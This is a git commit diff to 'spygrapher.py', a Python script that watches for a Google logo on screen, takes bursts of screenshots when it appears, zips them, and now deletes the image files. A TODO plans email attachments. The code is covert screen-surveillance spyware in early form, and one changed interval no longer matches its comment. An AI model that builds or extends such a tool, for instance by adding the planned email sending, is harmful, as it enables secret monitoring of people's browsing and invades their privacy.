953867dced9ced4e5f06e4dd134b83203c49db05
FrancoARossi <rossifrancoa@gmail.com>
2019-01-29 20:03:58 -0300

    Delete images after compression

--- spygrapher.py
+++ spygrapher.py
@@ -1,9 +1,10 @@
 import pyautogui, pyscreeze, time, os, zipfile
 
-#TODO delete images from the data folder after compression
-#TODO implement email attachments
-#TODO if a folder doesn't exist, create it
+''' Thing to do in order of importance'''
+
 #TODO dinamic image to locate
+#TODO if a folder doesn't exist, create it
+#TODO implement email attachments
 
 current_path = os.path.dirname(os.path.realpath(__file__))
 
@@ -11,6 +12,12 @@ def getCurrentDateTime():
 	current_date_time = time.localtime()
 	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
 	return formatted_time
+
+def deleteImages():
+	data_dir = current_path + '/data/'
+	for file in os.listdir(data_dir):
+		if file.endswith('.png'):
+			os.remove(os.path.join(data_dir, file))
 
 def createZip():
 	date_time = getCurrentDateTime()
@@ -31,13 +38,15 @@ if __name__ == '__main__':
 	while True:
 		try:
 			pyautogui.locateOnScreen(current_path +'/sources/google_logo_1.png', confidence = 0.9) # Locate the image on screen with a confidence of 90%
-			takeScreenshots(10, 4) # When it's located take 10 screenshots with a interval of 4 seconds
+			takeScreenshots(10, 0.5) # When it's located take 10 screenshots with a interval of 4 seconds
 			createZip()
+			deleteImages()
 		except pyscreeze.ImageNotFoundException:
 			try:
 				pyautogui.locateOnScreen(current_path + '/sources/google_logo_2.png', confidence=0.9)
 				takeScreenshots(10, 4)
 				createZip()
+				deleteImages()
 			except pyscreeze.ImageNotFoundException:
 				pass
 		time.sleep(1) # Reduces the cpu usage by about 10% while the image isn't located. Total usage between 3.5% and 5%
